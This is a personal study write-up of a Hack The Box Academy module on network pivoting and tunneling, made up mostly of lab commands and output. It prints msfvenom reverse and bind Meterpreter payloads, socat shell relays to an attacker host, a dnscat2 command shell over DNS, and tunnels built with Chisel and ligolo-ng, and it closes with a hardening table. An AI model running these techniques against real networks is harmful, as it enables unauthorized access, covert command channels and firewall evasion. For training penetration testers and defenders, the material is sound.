# Pivoting, Tunneling, and Port Forwarding

**Platform:** Hack The Box Academy
**Module:** Pivoting, Tunneling, and Port Forwarding
**Sections:** 18
**Difficulty:** Medium
**Category:** Offensive Security / Network Pivoting
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Table of Contents

1. [Overview](#overview)
2. [Key Concepts — Lateral Movement vs Pivoting vs Tunneling](#key-concepts)
3. [Networking Fundamentals for Pivoting](#networking-fundamentals-for-pivoting)
4. [SSH Port Forwarding](#ssh-port-forwarding)
   - [Local Port Forwarding](#local-port-forwarding)
   - [Dynamic Port Forwarding and SOCKS Tunneling](#dynamic-port-forwarding-and-socks-tunneling)
   - [Remote/Reverse Port Forwarding](#remotereverse-port-forwarding)
5. [Meterpreter Tunneling and Port Forwarding](#meterpreter-tunneling-and-port-forwarding)
6. [Socat Redirection](#socat-redirection)
   - [Reverse Shell Redirection](#reverse-shell-redirection)
   - [Bind Shell Redirection](#bind-shell-redirection)
7. [SSH for Windows — plink.exe](#ssh-for-windows--plinkexe)
8. [sshuttle — Transparent SSH Proxy](#sshuttle--transparent-ssh-proxy)
9. [Web Server Pivoting with rpivot](#web-server-pivoting-with-rpivot)
10. [Port Forwarding with Windows Netsh](#port-forwarding-with-windows-netsh)
11. [DNS Tunneling with dnscat2](#dns-tunneling-with-dnscat2)
12. [SOCKS5 Tunneling with Chisel](#socks5-tunneling-with-chisel)
13. [ICMP Tunneling with ptunnel-ng](#icmp-tunneling-with-ptunnel-ng)
14. [RDP and SOCKS Tunneling with ligolo-ng](#rdp-and-socks-tunneling-with-ligolo-ng)
15. [Double Pivots](#double-pivots)
16. [Hardening and Defensive Considerations](#hardening-and-defensive-considerations)
17. [Key Tools Reference](#key-tools-reference)
18. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Overview

During penetration tests and red team engagements, compromised hosts frequently sit on multiple network segments — the primary access path is only one step into the environment. Pivoting is the technique of using a compromised host as a relay to reach network segments, services, and systems that are otherwise unreachable from the attack host directly.

This module covers the full pivoting toolkit: SSH tunnels, Metasploit routing, Socat redirectors, Chisel, ligolo-ng, rpivot, dnscat2, ptunnel-ng, Windows Netsh, and plink — each solving a slightly different access challenge in a segmented environment.

### When to Pivot

After gaining a foothold on any host, immediately check:

```bash
# Linux — check all network interfaces
ifconfig
ip a

# Linux — check routing table
netstat -r
ip route

# Windows — check all network interfaces
ipconfig /all

# Windows — check routing table
route print
```

Any secondary NIC or unexpected subnet in the routing table is a pivoting opportunity. Document every IP range discovered — each one is a potential path deeper into the environment.

---

## Key Concepts

### Lateral Movement vs Pivoting vs Tunneling

These three terms are often used interchangeably but describe distinct actions:

| Concept | Definition | Goal |
|---------|-----------|------|
| **Lateral Movement** | Using valid credentials or exploits to access additional hosts within the same network segment | Spread wide — more hosts, elevated privileges |
| **Pivoting** | Using a compromised host to relay traffic into otherwise unreachable network segments | Go deeper — access isolated segments |
| **Tunneling** | Encapsulating one protocol inside another to obfuscate traffic or bypass firewall restrictions | Evade detection — disguise C2 or exfiltration traffic |

**Practical distinction:**
- Lateral movement: used the same local admin hash to move from one workstation to three others in the same subnet.
- Pivoting: used a dual-homed engineering workstation to reach a segregated OT network.
- Tunneling: wrapped C2 callbacks inside DNS TXT records to bypass HTTPS inspection.

---

## Networking Fundamentals for Pivoting

### Identifying Dual-Homed Hosts

```bash
# Linux pivot host — look for multiple NICs with different subnets
ubuntu@WEB01:~$ ifconfig

ens192: inet 10.129.202.64   # reachable from attack host
ens224: inet 172.16.5.129    # internal network — new segment discovered
lo:     inet 127.0.0.1
```

```powershell
# Windows — identify additional network adapters
PS C:\> ipconfig /all
```

The presence of `ens224` with `172.16.5.129` immediately tells us there is an internal `172.16.5.0/23` network reachable through this pivot host that our attack host cannot reach directly.

### Reading the Routing Table

```bash
Hackerpatel007_1@htb[/htb]$ netstat -r

Kernel IP routing table
Destination     Gateway         Genmask         Flags  Iface
default         178.62.64.1     0.0.0.0         UG     eth0
10.10.10.0      10.10.14.1      255.255.254.0   UG     tun0
10.129.0.0      10.10.14.1      255.255.0.0     UG     tun0
```

Routes tell you which networks the host can reach and via which interface. When we add pivot routes via Metasploit's AutoRoute or ligolo-ng, entries appear here showing traffic for internal subnets being forwarded through the pivot session.

### Ping Sweep — Discovering Internal Hosts

```bash
# Linux one-liner — ICMP sweep of internal segment
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# Windows CMD one-liner
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# PowerShell one-liner
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}

# Meterpreter ping sweep module
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

> **Note:** ICMP may be blocked by Windows Defender. If ping sweeps return no results, fall back to TCP port scanning via proxychains.

---

## SSH Port Forwarding

SSH is the most reliable and widely available pivoting tool in almost every environment. It provides local, dynamic, and remote port forwarding out of the box with no additional tools.

---

### Local Port Forwarding

Binds a port on the attack host's localhost and forwards all traffic to a specific port on a remote host — reachable from the pivot server.

**Use case:** MySQL on the Ubuntu pivot host is only listening on `127.0.0.1:3306`. Make it accessible locally on the attack host at `1234`.

```bash
# Syntax: ssh -L [local_port]:[target_host]:[target_port] [user]@[pivot]
Hackerpatel007_1@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# Verify the forward is active
Hackerpatel007_1@htb[/htb]$ netstat -antp | grep 1234
tcp  0  0  127.0.0.1:1234  0.0.0.0:*  LISTEN  4034/ssh

# Confirm MySQL is now accessible locally
Hackerpatel007_1@htb[/htb]$ nmap -v -sV -p1234 localhost
PORT     STATE  SERVICE  VERSION
1234/tcp open   mysql    MySQL 8.0.28-0ubuntu0.20.04.3

# Forward multiple ports simultaneously
Hackerpatel007_1@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

---

### Dynamic Port Forwarding and SOCKS Tunneling

Creates a SOCKS proxy on the attack host. Any tool prefixed with `proxychains` will have its traffic routed through the SSH tunnel to the internal network — allowing scanning and interaction with any host the pivot can reach.

```bash
# Start SOCKS proxy on local port 9050 via SSH dynamic forwarding
Hackerpatel007_1@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64

# Configure proxychains to use port 9050
Hackerpatel007_1@htb[/htb]$ tail -4 /etc/proxychains.conf
socks4  127.0.0.1 9050

# Scan internal hosts through the tunnel (full TCP connect scan only — no SYN)
Hackerpatel007_1@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19

Discovered open port 445/tcp on 172.16.5.19
Discovered open port 135/tcp on 172.16.5.19
Discovered open port 3389/tcp on 172.16.5.19
Discovered open port 139/tcp on 172.16.5.19

# Run Metasploit through proxychains
Hackerpatel007_1@htb[/htb]$ proxychains msfconsole

# Scan for RDP on internal host via Metasploit rdp_scanner
msf6 > use auxiliary/scanner/rdp/rdp_scanner
msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
msf6 auxiliary(scanner/rdp/rdp_scanner) > run

[*] 172.16.5.19:3389 - Detected RDP on 172.16.5.19:3389 (name:DC01) (os_version:10.0.17763)

# RDP to internal host through the SOCKS tunnel
Hackerpatel007_1@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

> **Critical:** proxychains only supports full TCP connect scans (`-sT`). Half-open SYN scans (`-sS`) will return incorrect results because proxychains cannot process partial packets. Also, disable ping checks (`-Pn`) since ICMP is not proxied.

---

### Remote/Reverse Port Forwarding

Used when the internal Windows target cannot route directly back to the attack host. The pivot host listens on a port and forwards incoming connections back to the attack host's listener — enabling reverse shells from otherwise unreachable hosts.

**Scenario:** Windows host at `172.16.5.19` has no route to the attack host. We need a Meterpreter reverse shell from it.

```bash
# Step 1 — Generate HTTPS payload pointing to the Ubuntu pivot's internal IP
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https \
  lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

# Step 2 — Configure Metasploit listener on attack host (port 8000)
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000

# Step 3 — Transfer payload to pivot host
Hackerpatel007_1@htb[/htb]$ scp backupscript.exe ubuntu@10.129.202.64:~/

# Step 4 — Serve payload from pivot host to Windows target
ubuntu@Webserver$ python3 -m http.server 8123

# Step 5 — Download payload on Windows target
PS C:\> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

# Step 6 — Create SSH remote port forward: Ubuntu:8080 → Attack Host:8000
Hackerpatel007_1@htb[/htb]$ ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN

# Step 7 — Execute payload on Windows — Meterpreter connects to Ubuntu:8080 → forwarded to Attack Host:8000
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1)
```

**Traffic flow:**
```
Windows Target → Ubuntu:8080 → (SSH tunnel) → Attack Host:8000 → Meterpreter session
```

---

## Meterpreter Tunneling and Port Forwarding

When a Meterpreter session is established on a pivot host, Metasploit provides its own built-in routing and proxying — no SSH required.

### AutoRoute — Adding Internal Routes

```bash
# Method 1 — From Meterpreter session directly
meterpreter > run autoroute -s 172.16.5.0/23

[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64

# Method 2 — Using the post module
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.

# Verify active routes
meterpreter > run autoroute -p

Active Routing Table
====================
Subnet             Netmask            Gateway
------             -------            -------
10.129.0.0         255.255.0.0        Session 1
172.16.5.0         255.255.254.0      Session 1
```

### SOCKS Proxy via Metasploit

```bash
# Start SOCKS proxy server through the Meterpreter session
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run

[*] Starting the SOCKS proxy server

# Update proxychains.conf
Hackerpatel007_1@htb[/htb]$ echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf

# Use proxychains to reach internal hosts through the Meterpreter session
Hackerpatel007_1@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

Discovered open port 3389/tcp on 172.16.5.19
```

### Meterpreter portfwd — Port-Level Forwarding

```bash
# Forward attack host local port 3300 → internal Windows RDP (3389)
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

# Reverse port forward — Windows sends shell to Ubuntu:1234 → forwarded to Attack Host:8081
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234

# Generate Windows payload targeting Ubuntu's internal IP
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

---

## Socat Redirection

Socat is a bidirectional relay that creates a pipe between two network channels without requiring SSH. It is particularly useful when SSH is not available on the pivot host or when a more lightweight redirector is needed.

### Reverse Shell Redirection

```bash
# On Ubuntu pivot host — listen on 8080, forward everything to attack host port 80
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Generate Windows payload — connects back to Ubuntu:8080 (socat forwards to attack host:80)
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

# Start listener on attack host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
msf6 exploit(multi/handler) > run

[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1)
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

**Traffic flow:**
```
Windows Target → Ubuntu:8080 → (socat) → Attack Host:80 → Meterpreter session
```

### Bind Shell Redirection

Used when the target cannot initiate outbound connections. The Windows host binds a listener; socat on the pivot forwards the Metasploit handler's connection to it.

```bash
# Generate Windows bind shell payload
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp \
  -f exe -o backupjob.exe LPORT=8443

# On Ubuntu pivot — listen on 8080, forward to Windows bind shell at 8443
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Metasploit bind handler connects to Ubuntu:8080 (socat bridges to Windows:8443)
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run

[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

---

## SSH for Windows — plink.exe

Plink (PuTTY Link) is a Windows command-line SSH client. Useful when the Windows host is the pivot point and no native SSH client is available (pre-Windows 10 systems).

```cmd
# Dynamic port forward from Windows pivot — creates SOCKS proxy on port 9050
plink -ssh -D 9050 ubuntu@10.129.15.50
```

After starting Plink, configure **Proxifier** on the Windows attack host to route traffic through `127.0.0.1:9050` (SOCKS4), then launch `mstsc.exe` normally — traffic is silently tunnelled.

> **Use case:** Older Windows targets where native SSH (OpenSSH) is absent; PuTTY or Plink is often already installed or present on a shared drive.

---

## sshuttle — Transparent SSH Proxy

sshuttle automatically creates iptables rules on the attack host to transparently route all traffic destined for the internal network through an SSH tunnel — no need for proxychains prefixes on individual commands.

```bash
# Install sshuttle
Hackerpatel007_1@htb[/htb]$ sudo apt-get install sshuttle

# Route all traffic for 172.16.5.0/23 through the Ubuntu pivot
Hackerpatel007_1@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

c : Connected to server.
fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300

# Now scan or connect directly — no proxychains needed
Hackerpatel007_1@htb[/htb]$ sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: inlanefreight.local
```

> **Advantage over proxychains:** Any tool — including those that do not support SOCKS — can reach the internal network transparently. sshuttle handles the iptables manipulation automatically.

---

## Web Server Pivoting with rpivot

rpivot is a reverse SOCKS proxy written in Python2. It is useful when outbound connections from the internal network are restricted — the pivot host initiates a connection back to the attack host's server, creating a SOCKS tunnel.

```bash
# Clone rpivot on attack host
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git

# Start rpivot server on attack host — SOCKS proxy on 9050, client connects on 9999
Hackerpatel007_1@htb[/htb]$ python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Transfer rpivot to pivot host
Hackerpatel007_1@htb[/htb]$ scp -r rpivot ubuntu@10.129.202.64:/home/ubuntu/

# On pivot host — connect back to attack host's rpivot server
ubuntu@WEB01:~/rpivot$ python2 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999

# Confirmed on attack host
New connection from host 10.129.202.64, source port 35226

# Browse internal web server through the SOCKS tunnel
Hackerpatel007_1@htb[/htb]$ proxychains firefox-esr 172.16.5.135:80
```

**NTLM-authenticated HTTP proxy variant** (corporate environments with proxy inspection):

```bash
python client.py --server-ip <target> --server-port 8080 \
  --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8081 \
  --domain <domain> --username <user> --password <pass>
```

---

## Port Forwarding with Windows Netsh

Netsh is a native Windows tool with built-in port proxying capability. No additional binaries needed — it is Living Off The Land (LOTL).

```cmd
# Forward connections on Windows host port 8080 → internal RDP host 172.16.5.25:3389
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 ^
  listenport=8080 listenaddress=10.129.15.150 ^
  connectport=3389 connectaddress=172.16.5.25

# Verify the port proxy rule
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:
Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.15.150   8080        172.16.5.25     3389

# From attack host — connect to Windows host port 8080 to reach internal RDP
Hackerpatel007_1@htb[/htb]$ xfreerdp /v:10.129.15.150:8080 /u:victor /p:pass@123
```

> **Advantage:** No binary upload required. Netsh is present on every Windows system and runs with no AV detection. Requires admin privileges to configure.

---

## DNS Tunneling with dnscat2

dnscat2 tunnels encrypted C2 traffic inside DNS TXT records. When HTTPS and other protocols are blocked or inspected by firewalls, DNS queries (port 53/UDP) are almost always permitted — making dnscat2 a powerful covert channel.

```bash
# Set up dnscat2 server on attack host
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
Hackerpatel007_1@htb[/htb]$ cd dnscat2/server/
Hackerpatel007_1@htb[/htb]$ sudo gem install bundler && sudo bundle install

# Start dnscat2 server
Hackerpatel007_1@htb[/htb]$ sudo ruby dnscat2.rb \
  --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

Starting Dnscat2 DNS server on 10.10.14.18:53 [domains = inlanefreight.local]
  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
```

```powershell
# On Windows target — clone dnscat2-powershell and import
PS C:\htb> git clone https://github.com/lukebaggett/dnscat2-powershell.git
PS C:\htb> Import-Module .\dnscat2.ps1

# Connect to dnscat2 server — send CMD shell session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local `
  -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

```bash
# Confirm session on attack host
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!

# Interact with the session
dnscat2> window -i 1

Microsoft Windows [Version 10.0.18363.1801]
C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

> **Stealth note:** DNS is encrypted and verified with a pre-shared secret. All C2 traffic appears as legitimate DNS queries — extremely difficult to detect without DNS-specific monitoring and behavioural analysis.

---

## SOCKS5 Tunneling with Chisel

Chisel is a fast TCP/UDP tunnelling tool written in Go that uses HTTP as its transport layer secured with SSH. It is extremely portable — a single binary runs on both Linux and Windows — and works through most firewalls since it uses HTTP.

### Forward Pivot (Chisel Server on Pivot Host)

```bash
# Clone and build Chisel on attack host
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
Hackerpatel007_1@htb[/htb]$ cd chisel && go build

# Transfer to pivot host
Hackerpatel007_1@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/

chisel                                        100%   11MB   1.2MB/s   00:09

# Start Chisel server on Ubuntu pivot — listen on port 1234, SOCKS5 enabled
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234

# Connect Chisel client from attack host — creates SOCKS5 proxy on local port 1080
Hackerpatel007_1@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:19 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)

# Update proxychains.conf to use port 1080
Hackerpatel007_1@htb[/htb]$ tail -f /etc/proxychains.conf
socks5 127.0.0.1 1080

# RDP to internal DC through the Chisel SOCKS5 tunnel
Hackerpatel007_1@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Reverse Pivot (Chisel Server on Attack Host)

Used when inbound connections to the pivot host are blocked by firewall rules — the pivot host initiates the outbound connection instead.

```bash
# Start Chisel server on attack host with --reverse
Hackerpatel007_1@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234

# On pivot host — connect client back to attack host using R:socks
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)

# Proxychains config remains the same — socks5 127.0.0.1 1080
Hackerpatel007_1@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## ICMP Tunneling with ptunnel-ng

ICMP tunneling encapsulates TCP traffic inside ICMP echo request/reply packets. When all TCP/UDP ports are blocked but the host is allowed to ping external servers, ICMP provides a covert channel.

```bash
# Clone and build ptunnel-ng on attack host
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
Hackerpatel007_1@htb[/htb]$ sudo ./autogen.sh

# Transfer to pivot host
Hackerpatel007_1@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# Start ptunnel-ng server on pivot host — listen for ICMP, forward SSH (port 22)
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

[inf]: Starting ptunnel-ng 1.42.
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.

# Start ptunnel-ng client on attack host — tunnel local port 2222 → pivot SSH via ICMP
Hackerpatel007_1@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

[inf]: Relaying packets from incoming TCP streams.

# SSH through the ICMP tunnel — connect to local port 2222
Hackerpatel007_1@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1

Welcome to Ubuntu 20.04.3 LTS

# After SSH session through ICMP tunnel, enable dynamic forwarding for full pivoting
Hackerpatel007_1@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

**Traffic flow:**
```
Attack Host:2222 → (ICMP packets) → Pivot Host → SSH daemon on pivot:22
```

> **Use case:** Environments where the firewall allows ICMP but blocks all TCP/UDP outbound connections. Rarely seen but critical to know for maximum-restriction scenarios.

---

## RDP and SOCKS Tunneling with ligolo-ng

ligolo-ng is a modern, lightweight pivoting tool that creates a virtual TUN interface on the attack host — routing traffic to internal networks transparently without proxychains. It is significantly faster than Chisel or SSH SOCKS proxies and supports full network scanning without restrictions.

```bash
# Download proxy (attack host) and agent (pivot host)
Hackerpatel007_1@htb[/htb]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
Hackerpatel007_1@htb[/htb]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
Hackerpatel007_1@htb[/htb]$ tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
Hackerpatel007_1@htb[/htb]$ tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Serve agent to pivot host
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000

# On pivot host — download and connect agent
ubuntu@pivot:~$ wget http://10.10.14.209:8000/agent
ubuntu@pivot:~$ chmod +x ./agent
ubuntu@pivot:~$ ./agent -connect 10.10.14.209:11601 --ignore-cert

INFO[0000] Connection established

# Start proxy on attack host
Hackerpatel007_1@htb[/htb]$ sudo ./proxy -selfcert

INFO[0000] Listening on 0.0.0.0:11601
ligolo-ng »

# Select session and configure autoroute to internal subnet
ligolo-ng » session
? Specify a session : 1 - ubuntu@pivot - 10.129.x.x:35974

[Agent : ubuntu@pivot] » autoroute
? Select routes to add: 172.16.5.0/24
? Create a new interface or use an existing one? Create a new interface
? Start the tunnel? Yes

INFO[0124] Starting tunnel to ubuntu@pivot

# Internal network is now fully routable — no proxychains needed
Hackerpatel007_1@htb[/htb]$ nmap -sV -p 3389 172.16.5.19
Hackerpatel007_1@htb[/htb]$ xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

> **Advantage over Chisel/sshuttle:** ligolo-ng creates a real TUN interface — all tools work natively without proxychains. SYN scans, UDP scans, and raw socket operations all work correctly.

---

## Double Pivots

On complex multi-segment networks, reaching a third (or further) network requires chaining pivots.

**Topology example:**
```
Attack Host → Pivot 1 (WEB01) → Pivot 2 (Windows jump host) → Target (DC01)
10.10.14.x     10.129.x.x / 172.16.5.x     172.16.5.x / 10.20.0.x    10.20.0.x
```

**With Meterpreter — chain AutoRoute sessions:**

```bash
# Session 1 — Meterpreter on WEB01 (172.16.5.129)
meterpreter > run autoroute -s 172.16.5.0/23

# Pivot to Windows jump host via Session 1 route — get Session 2
# Session 2 — Meterpreter on Windows jump host (172.16.5.x)
meterpreter > run autoroute -s 10.20.0.0/24

# Now route through both — reach 10.20.0.x network
msf6 > use auxiliary/server/socks_proxy
# Configure proxychains and reach DC01 at 10.20.0.x
```

**With ligolo-ng — add a second tunnel:**

```bash
# After first tunnel to 172.16.5.0/24 is up
# Transfer ligolo-ng agent to the Windows jump host
# Connect second agent — ligolo-ng shows session 2
ligolo-ng » session
? Specify a session: 2 - WINUSER@JUMP01

[Agent : WINUSER@JUMP01] » autoroute
? Select routes to add: 10.20.0.0/24
? Start the tunnel? Yes

# 10.20.0.0/24 is now directly reachable from the attack host
```

---

## Hardening and Defensive Considerations

| Control | Technique Mitigated | Implementation |
|---------|--------------------|----|
| **Network segmentation** | Pivoting, Lateral Movement | Confine hosts to minimum required network access; use VLANs and ACLs |
| **Firewall egress filtering** | Tunneling, ICMP tunneling, DNS tunneling | Block outbound protocols not required for business function; restrict DNS to internal resolvers only |
| **MFA on remote services** | Pass-the-Hash, credential reuse | Require MFA for SSH, RDP, and VPN — even with a valid credential, the attacker cannot authenticate |
| **Disable ICMP externally** | ICMP tunneling (ptunnel-ng) | Block ICMP echo to/from external IPs at the perimeter firewall |
| **DNS monitoring** | DNS tunneling (dnscat2) | Baseline DNS query volumes; alert on TXT record queries or unusually high query rates from internal hosts |
| **Port restriction on firewalls** | Non-standard port tunneling | Allow only explicitly required ports; deny-by-default outbound policy |
| **EDR/AV coverage** | Chisel, ligolo-ng agent delivery | Detect binary execution of known tunneling tools; monitor for Go-compiled binaries on non-developer hosts |
| **Audit netsh rules** | Netsh port proxy (LOTL) | Periodically enumerate `netsh interface portproxy show all` across Windows hosts |
| **Outbound proxy requirements** | rpivot, reverse tunnels | Force all outbound traffic through authenticated proxies; log and inspect all connections |
| **SIEM correlation** | All tunneling | Correlate Sysmon event ID 3 (network connections) with parent process analysis to detect tunneling tools |

---

## Key Tools Reference

| Tool | Platform | Use Case |
|------|----------|---------|
| `ssh -L` | Linux/macOS | Local port forward — expose a remote port locally |
| `ssh -D` | Linux/macOS | Dynamic port forward — full SOCKS proxy via SSH |
| `ssh -R` | Linux/macOS | Remote/reverse port forward — route shells back through pivot |
| `proxychains` | Linux | Route any tool's TCP traffic through a SOCKS proxy |
| `sshuttle` | Linux | Transparent SSH proxy — no proxychains prefix needed |
| `socat` | Linux | Bidirectional relay — reverse and bind shell redirection |
| `plink.exe` | Windows | PuTTY SSH client for Windows pivot hosts |
| `Proxifier` | Windows | Route Windows application traffic through SOCKS proxy |
| `netsh.exe` | Windows | Native Windows port proxy — LOTL pivoting |
| `Chisel` | Cross-platform | HTTP/SSH SOCKS5 tunnel — firewall evasion |
| `ligolo-ng` | Cross-platform | TUN interface pivot — transparent, fast, no proxychains |
| `rpivot` | Linux/Python | Reverse SOCKS proxy — pivot host connects out to attack host |
| `dnscat2` | Cross-platform | Encrypted C2 tunnel over DNS — deep firewall bypass |
| `ptunnel-ng` | Linux | ICMP tunnel — when all TCP/UDP is blocked |
| `meterpreter portfwd` | Metasploit | Per-port TCP relay through Meterpreter session |
| `AutoRoute` | Metasploit | Add internal subnet routes via Meterpreter session |
| `socks_proxy` | Metasploit | SOCKS proxy server through Meterpreter session |
| `ping_sweep` | Metasploit | ICMP host discovery through Meterpreter |

### Quick Command Reference

| Command | Purpose |
|---------|---------|
| `ssh -L 1234:localhost:3306 user@pivot` | Local forward — expose remote MySQL on local:1234 |
| `ssh -D 9050 user@pivot` | Dynamic forward — SOCKS proxy on local:9050 |
| `ssh -R pivot_ip:8080:0.0.0.0:8000 user@pivot -vN` | Remote forward — relay reverse shells through pivot |
| `proxychains nmap -v -Pn -sT 172.16.5.19` | Nmap through SOCKS (TCP connect only) |
| `proxychains xfreerdp /v:172.16.5.19 /u:user /p:pass` | RDP through SOCKS proxy |
| `sudo sshuttle -r user@pivot 172.16.5.0/23 -v` | Transparent pivot — no proxychains needed |
| `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80` | Socat redirector on pivot host |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=<ip> connectport=3389 connectaddress=<target>` | Windows native port proxy |
| `./chisel server -v -p 1234 --socks5` | Start Chisel server on pivot (forward pivot) |
| `./chisel client -v pivot:1234 socks` | Connect Chisel client from attack host |
| `sudo ./chisel server --reverse -v -p 1234 --socks5` | Chisel server on attack host (reverse pivot) |
| `./chisel client -v attack:1234 R:socks` | Chisel client from pivot (reverse connection) |
| `sudo ./proxy -selfcert` | Start ligolo-ng proxy on attack host |
| `./agent -connect attack:11601 --ignore-cert` | Connect ligolo-ng agent from pivot host |
| `meterpreter > run autoroute -s 172.16.5.0/23` | Add Meterpreter route to internal subnet |
